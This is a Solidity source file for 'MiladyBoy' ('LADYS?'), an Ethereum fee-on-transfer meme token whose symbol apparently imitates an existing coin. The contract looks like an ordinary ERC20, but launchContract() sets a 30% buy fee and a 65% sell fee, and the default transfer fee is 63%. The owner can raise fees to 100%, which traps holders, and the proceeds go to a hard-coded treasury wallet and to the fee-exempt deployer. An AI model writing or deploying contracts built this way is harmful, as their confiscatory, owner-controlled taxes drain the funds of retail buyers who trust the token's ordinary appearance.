// SPDX-License-Identifier: MIT
/**
 * https://miladyboy.agency/
 * https://t.me/MiladyBoyERC
 * https://twitter.com/MiladyBoyERC
 */
pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address uniV2Pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address uniV2Pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);


    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MiladyBoy is IERC20, Ownable {
    using SafeMath for uint256;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    string private constant _name = "MiladyBoy";
    string private constant _symbol = "LADYS?";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 888000888000888 * (10 ** _decimals);
    uint256 private _maxTxPer10000 = 200; // base 10000;
    uint256 private _maxTransferPer10000 = 200;
    uint256 private _maxWalletPer10000 = 200;
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isFeeExempt;
    IRouter uniV2Router;
    address public uniV2Pair;
    bool private tradingOpen = false;
    uint256 private marketingFee = 300;
    uint256 private developmentFee = 300;
    uint256 private totalFee = 0;
    uint256 private sellFee = 600;
    uint256 private transferFee = 6300;
    uint256 private denominator = 10000;
    bool private swapEnabled = true;
    bool private swapping;
    uint256 private swapThreshold = (_totalSupply * 10) / 100000;
    uint256 private minTokenAmount = (_totalSupply * 10) / 100000;

    modifier onSwapback() {
        swapping = true;
        _;
        swapping = false;
    }

    address internal teamWallet;
    address internal constant treasuryWallet =
        0xa2F6Ee4E91eeb13d70d24E9a93cB1Cb4a2F52987;

    constructor() Ownable(msg.sender) {
        IRouter _uniV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _uniV2Pair = IFactory(_uniV2Router.factory()).createPair(
            address(this),
            _uniV2Router.WETH()
        );
        uniV2Router = _uniV2Router;
        uniV2Pair = _uniV2Pair;
        totalFee = marketingFee + developmentFee;
        teamWallet = msg.sender;
        isFeeExempt[address(this)] = true;
        isFeeExempt[treasuryWallet] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function launchContract() external onlyOwner {
        totalFee = 3000;
        sellFee = 6500;
        tradingOpen = true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function exemptFromFees(address _address, bool _enabled) external onlyOwner {
        isFeeExempt[_address] = _enabled;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function walletLimit() public view returns (uint256) {
        return (totalSupply() * _maxWalletPer10000) / denominator;
    }

    function txLimit() public view returns (uint256) {
        return (totalSupply() * _maxTxPer10000) / denominator;
    }

    function transferLimit() public view returns (uint256) {
        return (totalSupply() * _maxTransferPer10000) / denominator;
    }

    function preTxCheck(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount > uint256(0),
            "Transfer amount must be greater than zero"
        );
        require(
            amount <= balanceOf(sender),
            "You are trying to transfer more than your balance"
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        preTxCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkMaxWallet(sender, recipient, amount);
        checkTxLimit(sender, recipient, amount);
        swapBack(sender, recipient);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, recipient, amount)
            : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function changeFee(
        uint256 _marketing,
        uint256 _development,
        uint256 _extraSell,
        uint256 _trans
    ) external onlyOwner {
        marketingFee = _marketing;
        developmentFee = _development;
        totalFee = _marketing + _development;
        sellFee = totalFee + _extraSell;
        transferFee = _trans;
        require(
            totalFee <= denominator && sellFee <= denominator,
            "totalFee and sellFee cannot be more than the denominator"
        );
    }

    function changeMaxLimits(
        uint256 _newMaxTx,
        uint256 _newMaxTransfer,
        uint256 _newMaxWallet
    ) external onlyOwner {
        uint256 newTx = (totalSupply() * _newMaxTx) / 10000;
        uint256 newTransfer = (totalSupply() * _newMaxTransfer) / 10000;
        uint256 newWallet = (totalSupply() * _newMaxWallet) / 10000;
        _maxTxPer10000 = _newMaxTx;
        _maxTransferPer10000 = _newMaxTransfer;
        _maxWalletPer10000 = _newMaxWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(
            newTx >= limit && newTransfer >= limit && newWallet >= limit,
            "Max TXs and Max Wallet cannot be less than .5%"
        );
    }

    function checkTradingAllowed(
        address sender,
        address recipient
    ) internal view {
        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(tradingOpen, "tradingOpen");
        }
    }

    function checkMaxWallet(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (
            !isFeeExempt[sender] &&
            !isFeeExempt[recipient] &&
            recipient != address(uniV2Pair) &&
            recipient != address(DEAD)
        ) {
            require(
                (_balances[recipient].add(amount)) <= walletLimit(),
                "Exceeds maximum wallet amount."
            );
        }
    }

    function checkTxLimit(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (sender != uniV2Pair) {
            require(
                amount <= transferLimit() ||
                    isFeeExempt[sender] ||
                    isFeeExempt[recipient],
                "TX Limit Exceeded"
            );
        }
        require(
            amount <= txLimit() ||
                isFeeExempt[sender] ||
                isFeeExempt[recipient],
            "TX Limit Exceeded"
        );
    }

    function swapbackTokens() private onSwapback {
        uint256 tokens = balanceOf(address(this));
        uint256 _denominator = (
            marketingFee.add(1).add(developmentFee)
        );

        swapTokensForETH(tokens);
        uint256 deltaBalance = address(this).balance;
        uint256 unitBalance = deltaBalance.div(_denominator);

        uint256 marketingAmt = unitBalance.mul(marketingFee);
        if (marketingAmt > 0) {
            payable(treasuryWallet).transfer(marketingAmt);
        }
        uint256 remainingBalance = address(this).balance;
        if (remainingBalance > uint256(0)) {
            payable(teamWallet).transfer(remainingBalance);
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        _approve(address(this), address(uniV2Router), tokenAmount);
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setSwapbackSettings(
        uint256 _swapThreshold,
        uint256 _minTokenAmount
    ) external onlyOwner {
        swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000));
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function swapBack(
        address sender,
        address recipient
    ) internal {
        if (shouldSwapBack(sender, recipient)) {
            swapbackTokens();
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function shouldSwapBack(
        address sender,
        address recipient
    ) internal view returns (bool) {
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return
            !swapping &&
            swapEnabled &&
            tradingOpen &&
            !isFeeExempt[sender] &&
            recipient == uniV2Pair &&
            aboveThreshold;
    }

    function shouldTakeFee(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(
        address sender,
        address recipient
    ) internal view returns (uint256) {
        if (recipient == uniV2Pair) {
            return sellFee;
        }
        if (sender == uniV2Pair) {
            return totalFee;
        }
        return transferFee;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (getTotalFee(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(
                getTotalFee(sender, recipient)
            );
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

}